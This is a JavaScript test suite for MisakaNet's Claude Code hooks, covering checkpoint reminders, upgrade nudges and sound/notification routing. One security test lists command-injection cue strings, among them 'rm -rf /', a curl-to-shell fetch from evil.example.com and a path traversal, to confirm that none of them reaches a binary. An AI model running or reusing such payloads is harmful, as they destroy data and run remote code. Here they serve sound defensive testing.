// Tests for the agent auto-start hook (integrations/agent-autostart/checkpoint_reminder.mjs).
//
// This file is not a worker; it lives in workers/ because that is the glob CI runs
// (`node --test workers/*.test.mjs` in mcp-stress.yml), and an untested hook is how the
// Python version shipped a silent no-op for anyone without Python.
//
// The hook is exercised as a subprocess, exactly as Claude Code runs it: JSON on stdin,
// text to inject on stdout. Run: node --test workers/agent-autostart-hook.test.mjs
import assert from 'node:assert/strict';
import test from 'node:test';
import { spawnSync } from 'node:child_process';
import { chmodSync, existsSync, mkdtempSync, readFileSync, readdirSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { dirname, join, resolve } from 'node:path';
import { fileURLToPath } from 'node:url';

// `fileURLToPath(import.meta.url)`, not `import.meta.dirname`: this suite runs on the Node 18 leg of
// the setup matrix (the hook ships inside the npm tarball, and `engines` promises >=18), and a test
// file that needs Node 20.11 just to *load* would hide an 18-incompatibility instead of reporting it.
const HOOK = resolve(dirname(fileURLToPath(import.meta.url)), '..', 'integrations', 'agent-autostart', 'checkpoint_reminder.mjs');

function runHook(payload, mode = 'prompt', env = {}) {
  const state = env.MISAKANET_HOOK_STATE || mkdtempSync(join(tmpdir(), 'mn-hook-'));
  // Never read the developer's own ~/.misakanet-agent: a version stamp sitting there (this
  // machine has one after installing) would make the upgrade nudge appear in unrelated tests.
  const agentDir = env.MISAKANET_AGENT_DIR || mkdtempSync(join(tmpdir(), 'mn-agent-'));
  const result = spawnSync(process.execPath, [HOOK, mode], {
    input: typeof payload === 'string' ? payload : JSON.stringify(payload),
    encoding: 'utf8',
    env: {
      ...process.env,
      MISAKANET_HOOK_STATE: state,
      MISAKANET_AGENT_DIR: agentDir,
      ...env,
    },
  });
  assert.equal(result.status, 0, `hooks must never break the session: ${result.stderr}`);
  return { stdout: result.stdout, state, agentDir };
}

test('announces itself on the first turn, then stays silent until the checkpoint', () => {
  const state = mkdtempSync(join(tmpdir(), 'mn-hook-'));
  const env = { MISAKANET_HOOK_STATE: state };
  // Turn 1 carries the self-announcement: a user who cannot inspect any config file learns
  // the install worked only if the assistant says so.
  const first = runHook({ session_id: 's' }, 'prompt', env).stdout;
  assert.match(first, /已接入失败经验库/, 'the first turn must carry the announcement');
  assert.match(first, /把 MisakaNet 关掉/, 'and how to undo it, in plain words');
  for (let turn = 2; turn < 20; turn += 1) {
    assert.equal(runHook({ session_id: 's' }, 'prompt', env).stdout, '', `turn ${turn} should be silent`);
  }
  const at20 = runHook({ session_id: 's' }, 'prompt', env).stdout;
  assert.match(at20, /检查点/);
  assert.match(at20, /20/);
  for (let turn = 21; turn < 30; turn += 1) {
    assert.equal(runHook({ session_id: 's' }, 'prompt', env).stdout, '', `turn ${turn} should be silent`);
  }
  assert.match(runHook({ session_id: 's' }, 'prompt', env).stdout, /30/, 'must fire again at 30');
  assert.equal(JSON.parse(readFileSync(join(state, 's.json'), 'utf8')).turn, 30);
});

test('sessions are counted independently', () => {
  const state = mkdtempSync(join(tmpdir(), 'mn-hook-'));
  runHook({ session_id: 'a' }, 'prompt', { MISAKANET_HOOK_STATE: state });
  runHook({ session_id: 'b' }, 'prompt', { MISAKANET_HOOK_STATE: state });
  assert.equal(JSON.parse(readFileSync(join(state, 'a.json'), 'utf8')).turn, 1);
  assert.equal(JSON.parse(readFileSync(join(state, 'b.json'), 'utf8')).turn, 1);
});

test('the threshold is configurable', () => {
  // Share one state dir: a fresh one per call would reset the counter to turn 1 and the
  // checkpoint could never be reached (that is how this test failed the first time).
  const state = mkdtempSync(join(tmpdir(), 'mn-hook-'));
  const env = { MISAKANET_HOOK_STATE: state, MISAKANET_CHECKPOINT_AT: '2', MISAKANET_CHECKPOINT_EVERY: '0' };
  assert.doesNotMatch(runHook({ session_id: 's' }, 'prompt', env).stdout, /检查点/, 'turn 1 is below the threshold');
  assert.match(runHook({ session_id: 's' }, 'prompt', env).stdout, /检查点/);
});

test('failure mode searches the error text, not the command', () => {
  const { stdout } = runHook(
    { tool_input: { command: 'docker compose up' }, error: 'Error response from daemon: exit code 137' },
    'failure',
  );
  assert.match(stdout, /exit code 137/);
  assert.doesNotMatch(stdout, /docker compose up/);
});

test('failure mode falls back to the command when there is no error text', () => {
  const { stdout } = runHook({ tool_input: { command: 'npm run build' } }, 'failure');
  assert.match(stdout, /npm run build/);
});

test('junk input never crashes, and garbage produces nothing', () => {
  for (const payload of ['', 'not json', '[1,2,3]']) {
    for (const mode of ['prompt', 'failure']) {
      assert.equal(runHook(payload, mode).stdout, '', `${mode} must ignore ${JSON.stringify(payload)}`);
    }
  }
  // '{}' is a valid empty payload on the default session, so turn 1 legitimately announces;
  // the property under test is "no crash, nothing but our own text".
  const empty = runHook('{}', 'prompt').stdout;
  assert.doesNotMatch(empty, /Error|Traceback|undefined/, empty);
});

test('an unknown mode does not crash', () => {
  assert.equal(runHook({ session_id: 's' }, 'wat').stdout, '');
});

test('the injected text is valid UTF-8 Chinese, not mojibake', () => {
  const env = { MISAKANET_CHECKPOINT_AT: '1', MISAKANET_CHECKPOINT_EVERY: '0' };
  const { stdout } = runHook({ session_id: 's' }, 'prompt', env);
  assert.match(stdout, /脱敏/, 'the reminder must reach the agent as readable text');
  assert.ok(!stdout.includes('\uFFFD'), 'no replacement characters in the output');
});

// ── the upgrade nudge (issue #1682) ─────────────────────────────────────────
// The installer stamps ~/.misakanet-agent/version; the hook decides whether to mention an
// upgrade at most once every 14 days. The hook never asks the registry itself — that is the
// agent's one cheap call — so what these tests pin is the *cadence*, which is the whole point:
// every session would be noise, and never would let users forget the tool is installed.

function agentDirWithStamp(daysAgo) {
  const dir = mkdtempSync(join(tmpdir(), 'mn-agent-'));
  const when = new Date(Date.now() - daysAgo * 24 * 60 * 60 * 1000).toISOString();
  writeFileSync(join(dir, 'version'), JSON.stringify({
    package: '@misaka-net/misakanet-setup', version: '0.3.0', installed_at: when,
  }));
  return dir;
}

test('a fresh install is not nudged', () => {
  const agentDir = agentDirWithStamp(1);
  const env = { MISAKANET_AGENT_DIR: agentDir, MISAKANET_HOOK_STATE: mkdtempSync(join(tmpdir(), 'mn-hook-')) };
  runHook({ session_id: 's' }, 'prompt', env);            // turn 1 (announcement only)
  const { stdout } = runHook({ session_id: 's' }, 'prompt', env);
  assert.equal(stdout, '', `nothing to say one day after installing: ${stdout}`);
});

test('an install older than the interval is nudged once, then quiet again', () => {
  const agentDir = agentDirWithStamp(15);
  // The throttle rides with the session state dir (same machine state, one place a user who
  // set MISAKANET_HOOK_STATE has to look).
  const hookState = mkdtempSync(join(tmpdir(), 'mn-hook-'));
  const env = { MISAKANET_AGENT_DIR: agentDir, MISAKANET_HOOK_STATE: hookState };
  const first = runHook({ session_id: 's' }, 'prompt', env).stdout;   // turn 1
  assert.match(first, /距上次确认已超过 14 天/, first);
  assert.match(first, /npm view @misaka-net\/misakanet-setup version/, 'the agent needs the exact command');
  assert.match(first, /npx @misaka-net\/misakanet-setup@latest/, 'and the upgrade command verbatim');

  for (const turn of [2, 3, 4]) {
    const { stdout } = runHook({ session_id: 's' }, 'prompt', env);
    assert.equal(stdout, '', `turn ${turn} must not repeat the nudge`);
  }
  assert.match(readFileSync(join(hookState, 'update-check.json'), 'utf8'), /last_asked/,
    'the throttle state is what makes the next 14 days quiet');
});

test('the nudge honours the opt-out, and stays silent when there is no stamp', () => {
  const old = agentDirWithStamp(15);
  const optedStateDir = mkdtempSync(join(tmpdir(), 'mn-hook-'));
  const opted = runHook({ session_id: 's' }, 'prompt',
    { MISAKANET_AGENT_DIR: old, MISAKANET_HOOK_STATE: optedStateDir, MISAKANET_NO_UPDATE_NOTICE: '1' }).stdout;
  assert.doesNotMatch(opted, /距上次确认/, opted);
  assert.ok(!existsSync(join(optedStateDir, 'update-check.json')),
    'an opted-out user must not accumulate throttle state either');

  const unstamped = mkdtempSync(join(tmpdir(), 'mn-agent-'));   // installed before stamping
  const legacy = runHook({ session_id: 's' }, 'prompt', { MISAKANET_AGENT_DIR: unstamped }).stdout;
  assert.doesNotMatch(legacy, /距上次确认/, legacy);
});

test('the interval is configurable, and upgrading resets the clock', () => {
  const dir = agentDirWithStamp(3);
  const env = { MISAKANET_AGENT_DIR: dir, MISAKANET_UPDATE_AFTER_DAYS: '2' };
  const { stdout } = runHook({ session_id: 's' }, 'prompt', env);
  assert.match(stdout, /超过 2 天/, stdout);

  // A re-install of a NEWER version moves installed_at forward; the timer restarts from there
  // even though the throttle file is still recent.
  const fresh = agentDirWithStamp(0);
  const reset = runHook({ session_id: 's' }, 'prompt',
    { MISAKANET_AGENT_DIR: fresh, MISAKANET_UPDATE_AFTER_DAYS: '1' }).stdout;
  assert.doesNotMatch(reset, /距上次确认/, reset);
});

// ── voice hook (opt-in `--voice`) ─────────────────────────────────────────────
// The cue arrives from the server as a `voice` field and has to survive two nests that were
// both observed with a real Claude Code session on 2026-09-16: the MCP result sits under
// `tool_response`, and for an MCP tool that value is a JSON *string* (the whole response is
// escaped inside it). The first version of the hook only walked objects and therefore stayed
// silent even when the server had sent the cue.
//
// Since issue #1785 the hook routes a cue to a *sound and/or a desktop notification*, so the
// dry-run output is no longer just the cue name: line 1 is still the cue (that is what the
// first two tests pin), lines 2-3 report the sound and the notification.
const VOICE_HOOK = resolve(dirname(fileURLToPath(import.meta.url)), '..', 'integrations', 'agent-autostart', 'voice_hook.mjs');

function voiceDir() {
  const dir = mkdtempSync(join(tmpdir(), 'mn-voice-'));
  for (const cue of ['lesson-found', 'failure-warning', 'connect-success', 'pair-success']) {
    writeFileSync(join(dir, `${cue}.mp3`), 'not really audio');
  }
  return dir;
}

function runVoice(payload, env = {}) {
  const dir = voiceDir();
  const result = spawnSync(process.execPath, [VOICE_HOOK], {
    input: typeof payload === 'string' ? payload : JSON.stringify(payload),
    encoding: 'utf8',
    env: {
      ...process.env,
      MISAKANET_VOICE_DRY_RUN: '1',
      MISAKANET_VOICE_DIR: dir,
      // Hermetic: a dry run must not be able to read (or be influenced by) the state of the
      // machine this test happens to run on.
      MISAKANET_HOOK_STATE: mkdtempSync(join(tmpdir(), 'mn-voice-state-')),
      ...env,
    },
  });
  rmSync(dir, { recursive: true, force: true });
  return result;
}

test('a flat voice field plays its cue', () => {
  const lines = runVoice({ voice: 'lesson-found' }).stdout.split('\n').map((l) => l.trim());
  assert.equal(lines[0], 'lesson-found');
  assert.equal(lines[1], 'sound=lesson-found.mp3 (would play)');
});

test('the cue survives tool_response and an escaped JSON string', () => {
  const inner = JSON.stringify({ results: [{ id: 'x' }], voice: 'failure-warning' });
  const payload = { hook_event_name: 'PostToolUse', tool_name: 'mcp__misakanet__misakanet_search', tool_response: inner };
  assert.equal(runVoice(payload).stdout.split('\n')[0].trim(), 'failure-warning');
});

test('an unknown cue is ignored, and the hook always exits 0', () => {
  const result = runVoice({ voice: 'not-a-cue' });
  assert.equal(result.stdout.trim(), '');
  assert.equal(result.status, 0);
});

test('MISAKANET_VOICE=0 mutes an installed hook', () => {
  const result = runVoice({ voice: 'lesson-found' }, { MISAKANET_VOICE: '0' });
  assert.equal(result.stdout.trim(), '');
  assert.equal(result.status, 0);
});

test('unparsable stdin is not an error', () => {
  const result = runVoice('not json at all');
  assert.equal(result.status, 0);
  assert.equal(result.stdout.trim(), '');
});

// ── attention routing: cue → sound + notification (issue #1785) ───────────────
// Two contracts are pinned here, and the second one is why every test below replaces the
// whole PATH with recording stubs:
//
//  1. the table: which cue produces which sound and which notification text, and which cues
//     notify only once per install;
//  2. the security rule: the cue is server-supplied and is used **only** as a key into that
//     table — never concatenated into a command, a path or a shell. So a cue that is not in
//     the table must produce no action *and reach no binary*. "No binary ran" is only
//     observable if the binaries are ours, hence `stubBin`.
const PLAYER_BINS = ['afplay', 'paplay', 'ffplay', 'mpv', 'mpg123', 'cvlc'];
const NOTIFIER_BINS = ['powershell.exe', 'osascript', 'notify-send'];

/** The routing contract, restated independently of the hook's own table. */
const EXPECTED_ROUTES = {
  'lesson-found': { sound: 'lesson-found.mp3', notify: 'MisakaNet：找到一条相关经验', once: false },
  'failure-warning': { sound: 'failure-warning.mp3', notify: '', once: false },
  'connect-success': { sound: 'connect-success.mp3', notify: 'MisakaNet：已连接', once: true },
  'pair-success': { sound: 'pair-success.mp3', notify: 'MisakaNet：已连接', once: true },
};

/** A PATH directory in which every player and notifier is a script that records its argv. */
function stubBin(names = [...PLAYER_BINS, ...NOTIFIER_BINS]) {
  const dir = mkdtempSync(join(tmpdir(), 'mn-stubbin-'));
  const log = join(dir, 'calls.log');
  const script = '#!/bin/sh\n'
    + '{ printf \'%s\' "${0##*/}"; for a in "$@"; do printf \'\\t%s\' "$a"; done; printf \'\\n\'; }'
    + ' >> "$MN_TEST_STUB_LOG"\n';
  for (const name of names) {
    const file = join(dir, name);
    writeFileSync(file, script);
    chmodSync(file, 0o755);
  }
  return { dir, log };
}

/** Recorded calls, one string per call: `binary<TAB>arg<TAB>arg`. */
function stubCalls(log) {
  try {
    return readFileSync(log, 'utf8').split('\n').filter(Boolean);
  } catch {
    return [];                                  // never ran: the log was never created
  }
}

const isNotifierCall = (line) =>
  /NotifyIcon|BalloonTipText|display notification/.test(line) || line.startsWith('notify-send\t');

/** On WSL *both* halves go through `powershell.exe`, so the binary name alone cannot tell a
 *  toast from a sound: the argv has to. Everything that is not a toast is the sound. */
const isPlayerCall = (line) => !isNotifierCall(line);

/** Spawned children are detached and outlive the hook, so nothing is observable the very
 *  instant `spawnSync` returns. Give the stubs a moment before asserting on the log. */
const settle = (ms = 500) => new Promise((resolve) => setTimeout(resolve, ms));

/**
 * PATH pointing at the stub directory and *nothing else*.
 *
 * Inheriting the real PATH is a trap in both directions: on WSL a real `powershell.exe` sits
 * on it, so a "real code path" test would pop an actual desktop notification — and attempt
 * actual audio — on the machine running the tests; on macOS the real `osascript` would do the
 * same. A stub-only PATH is what makes "this binary ran" and "no binary ran" observable
 * facts instead of assumptions.
 */
const stubPath = (bin) => ({ PATH: bin.dir, MN_TEST_STUB_LOG: bin.log });

/** Real (non-dry) run with stub binaries, a throwaway state dir and real cue files. */
function runVoiceReal(payload, env = {}) {
  const dir = voiceDir();
  const state = env.MISAKANET_HOOK_STATE || mkdtempSync(join(tmpdir(), 'mn-voice-state-'));
  const result = spawnSync(process.execPath, [VOICE_HOOK], {
    input: typeof payload === 'string' ? payload : JSON.stringify(payload),
    encoding: 'utf8',
    env: { ...process.env, MISAKANET_VOICE_DIR: dir, MISAKANET_HOOK_STATE: state, ...env },
  });
  rmSync(dir, { recursive: true, force: true });
  return { ...result, state };
}

test('the table routes every cue the server can send', () => {
  for (const [cue, route] of Object.entries(EXPECTED_ROUTES)) {
    const lines = runVoice({ voice: cue }).stdout.split('\n').map((l) => l.trim()).filter(Boolean);
    assert.equal(lines[0], cue, `${cue}: the cue is still the first line`);
    assert.equal(lines[1], `sound=${route.sound} (would play)`, `${cue}: every cue sounds`);
    if (route.notify) {
      assert.equal(lines[2], `notify=would send "${route.notify}"${route.once ? ' (first time only)' : ''}`,
        `${cue}: exact notification text, and "first time only" exactly when it is deduped`);
    } else {
      assert.match(lines[2], /^notify=none/, `${cue} must not notify — sound only`);
    }
    assert.equal(lines.length, 3, `${cue}: nothing else may be printed`);
  }
});

test('the shipped table holds exactly these cues and nothing else', () => {
  // Behaviour alone cannot pin this: the hook can only route what its table holds, so a new
  // row — a cue that would now play a sound, or a notification nobody reviewed — is invisible
  // from the outside. The table is the security boundary (the only thing a server-supplied
  // cue can select), so it is read and pinned structurally as well.
  const source = readFileSync(VOICE_HOOK, 'utf8');
  const keys = [...source.matchAll(/^ {2}'([a-z][a-z0-9-]*)': Object\.freeze\(\{/gm)].map((m) => m[1]);
  assert.deepEqual(keys.sort(), Object.keys(EXPECTED_ROUTES).sort(),
    'every cue in the table must be covered by this test file');
});

test('the notification texts stay short and non-alarming', () => {
  for (const route of Object.values(EXPECTED_ROUTES)) {
    if (!route.notify) continue;
    assert.ok(route.notify.length <= 30, `"${route.notify}" is longer than a toast should be`);
    assert.doesNotMatch(route.notify, /[!！]|快来|立即|恭喜/i, `"${route.notify}" must state what happened`);
  }
});

test('an unknown cue is ignored, and the hook always exits 0', () => {
  const result = runVoice({ voice: 'not-a-cue' });
  assert.equal(result.stdout.trim(), '');
  assert.equal(result.status, 0);
});

test('a hostile cue reaches no binary at all (the cue is only ever a table key)', async () => {
  const bin = stubBin();
  const state = mkdtempSync(join(tmpdir(), 'mn-voice-state-'));
  const env = { ...stubPath(bin), MISAKANET_HOOK_STATE: state };
  const hostile = [
    'x; rm -rf / #',
    '$(curl http://evil.example.com/x.sh | sh)',
    '`id`',
    '../../../../tmp/pwned',
    'lesson-found; notify-send pwned',          // embeds a real cue name, must still route nowhere
    'lesson-found\nrm -rf /',                   // the bare-name fallback must match the whole line
    'A'.repeat(5000),
    'not-a-cue',
  ];
  for (const cue of hostile) {
    // Deliberately NOT a dry run: this is the real code path, and the stubs above would
    // happily record anything the hook decided to execute.
    const result = runVoiceReal({ voice: cue }, env);
    assert.equal(result.status, 0, `a hook must never break the session (${cue.slice(0, 24)})`);
    assert.equal(result.stdout.trim(), '', `a cue that is not in the table must print nothing`);
    assert.equal(result.stderr.trim(), '', `and must not complain either`);
  }
  await settle();
  assert.deepEqual(stubCalls(bin.log), [], 'no player and no notifier may run for an unknown cue');
  assert.deepEqual(readdirSync(state), [], 'and no state file may be written either');
});

test('MISAKANET_NOTIFY=0 turns off the notification only', async () => {
  const bin = stubBin();
  const state = mkdtempSync(join(tmpdir(), 'mn-voice-state-'));
  const env = {
    ...stubPath(bin),
    MISAKANET_HOOK_STATE: state, MISAKANET_NOTIFY: '0',
  };
  assert.equal(runVoiceReal({ voice: 'lesson-found' }, env).status, 0);
  await settle();
  const calls = stubCalls(bin.log);
  assert.equal(calls.filter(isPlayerCall).length, 1, 'the sound must still play');
  assert.equal(calls.filter(isNotifierCall).length, 0, 'but no notification may be sent');

  // The one-time ledger is deliberately not touched while notifications are off: a user who
  // turns them back on has still never seen their first connect-success toast.
  const dry = runVoice({ voice: 'connect-success' }, { MISAKANET_HOOK_STATE: state, MISAKANET_NOTIFY: '0' });
  assert.match(dry.stdout, /notify=disabled \(MISAKANET_NOTIFY=0\)/);
  assert.ok(!existsSync(join(state, 'voice-notified.json')));
});

test('MISAKANET_VOICE=0 silences sound and notifications together', async () => {
  const bin = stubBin();
  const env = {
    ...stubPath(bin), MISAKANET_VOICE: '0',
  };
  assert.equal(runVoiceReal({ voice: 'lesson-found' }, env).status, 0);
  assert.equal(runVoiceReal({ voice: 'connect-success' }, env).status, 0);
  await settle();
  assert.deepEqual(stubCalls(bin.log), [], 'the master switch mutes both halves');
  assert.equal(runVoice({ voice: 'lesson-found' }, { MISAKANET_VOICE: '0' }).stdout.trim(), '');
});

test('a missing notification binary degrades silently', async () => {
  // No notifier on PATH at all: the hook must skip the notification without printing
  // anything and without a non-zero exit — a hook that errors here surfaces as a tool
  // failure in the middle of someone's session.
  const bin = stubBin(PLAYER_BINS);            // players only: no notify-send/osascript/powershell
  const state = mkdtempSync(join(tmpdir(), 'mn-voice-state-'));
  const result = runVoiceReal({ voice: 'lesson-found' }, {
    ...stubPath(bin), MISAKANET_HOOK_STATE: state,
  });
  assert.equal(result.status, 0);
  assert.equal(result.stdout.trim(), '');
  assert.equal(result.stderr.trim(), '');
  await settle();
  assert.equal(stubCalls(bin.log).filter(isNotifierCall).length, 0, 'nothing may try to notify');

  // Nothing at all on PATH: same silence, and still exit 0.
  const empty = mkdtempSync(join(tmpdir(), 'mn-nobin-'));
  const bare = runVoiceReal({ voice: 'connect-success' }, {
    PATH: empty, MN_TEST_STUB_LOG: bin.log, MISAKANET_HOOK_STATE: state,
  });
  assert.equal(bare.status, 0);
  assert.equal(bare.stdout.trim(), '');
  assert.equal(bare.stderr.trim(), '');
});

test('a dry run reports both kinds of action and executes neither', () => {
  const state = mkdtempSync(join(tmpdir(), 'mn-voice-state-'));
  const env = { MISAKANET_HOOK_STATE: state };
  const first = runVoice({ voice: 'connect-success' }, env).stdout;
  assert.match(first, /^connect-success$/m);
  assert.match(first, /^sound=connect-success\.mp3 \(would play\)$/m);
  assert.match(first, /^notify=would send "MisakaNet：已连接" \(first time only\)$/m);
  // Read-only: a preview must not consume the one-time notification...
  const second = runVoice({ voice: 'connect-success' }, env).stdout;
  assert.match(second, /\(first time only\)/, 'dry runs do not dedupe against each other');
  assert.ok(!existsSync(join(state, 'voice-notified.json')), 'a dry run writes no state');
});

test('connect-success and pair-success notify once per install, sound every time', async () => {
  const bin = stubBin();
  const state = mkdtempSync(join(tmpdir(), 'mn-voice-state-'));
  const env = { ...stubPath(bin), MISAKANET_HOOK_STATE: state };

  assert.equal(runVoiceReal({ voice: 'connect-success' }, env).status, 0);
  await settle();
  let calls = stubCalls(bin.log);
  assert.equal(calls.filter(isPlayerCall).length, 1);
  const firstToasts = calls.filter(isNotifierCall);
  assert.equal(firstToasts.length, 1, `exactly one notification: ${JSON.stringify(firstToasts)}`);
  assert.ok(firstToasts[0].includes('MisakaNet：已连接'),
    `the toast must carry the table's text, whatever the platform: ${firstToasts[0]}`);

  // Same cue again: the sound repeats, the notification does not.
  assert.equal(runVoiceReal({ voice: 'connect-success' }, env).status, 0);
  await settle();
  calls = stubCalls(bin.log);
  assert.equal(calls.filter(isPlayerCall).length, 2, 'the sound is not deduped');
  assert.equal(calls.filter(isNotifierCall).length, 1, 'the notification is');

  // A different cue has its own first time.
  assert.equal(runVoiceReal({ voice: 'pair-success' }, env).status, 0);
  await settle();
  assert.equal(stubCalls(bin.log).filter(isNotifierCall).length, 2);

  // The ledger is small, atomic (no leftover temp file) and honest about when it fired.
  const ledger = JSON.parse(readFileSync(join(state, 'voice-notified.json'), 'utf8'));
  assert.deepEqual(Object.keys(ledger).sort(), ['connect-success', 'pair-success']);
  assert.match(ledger['connect-success'], /^\d{4}-\d{2}-\d{2}T/);
  assert.ok(!existsSync(join(state, 'voice-notified.json.tmp')));

  // And the dedupe is visible to the debug path the docs tell users to run.
  const after = runVoice({ voice: 'connect-success' }, env).stdout;
  assert.match(after, /^notify=already sent at \d{4}-\d{2}-\d{2}T.*\(first time only\)$/m);
});

test('an unwritable state directory breaks nothing', async () => {
  const bin = stubBin();
  // A *file* where the state directory should be: mkdir/rename both fail, and the hook must
  // go on and notify anyway (worse case: one repeated toast, never a broken session).
  const stateFile = join(mkdtempSync(join(tmpdir(), 'mn-voice-state-')), 'not-a-directory');
  writeFileSync(stateFile, 'occupied');
  const env = { ...stubPath(bin), MISAKANET_HOOK_STATE: stateFile };

  for (const run of [1, 2]) {
    const result = runVoiceReal({ voice: 'connect-success' }, env);
    assert.equal(result.status, 0, `run ${run} must still exit 0`);
    assert.equal(result.stdout.trim(), '');
    assert.equal(result.stderr.trim(), '', `run ${run} must not complain about state`);
  }
  await settle();
  assert.equal(stubCalls(bin.log).filter(isNotifierCall).length, 2, 'both runs still notified');
});
